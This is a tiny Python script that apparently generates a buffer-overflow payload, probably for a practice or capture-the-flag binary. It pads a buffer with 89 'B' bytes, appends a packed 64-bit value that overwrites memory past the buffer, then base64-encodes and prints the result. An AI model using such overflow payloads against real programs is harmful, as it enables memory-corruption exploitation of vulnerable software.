
import sys
import struct
import base64

buf = b'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
buf += struct.pack('<Q', 4948215049097262017)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
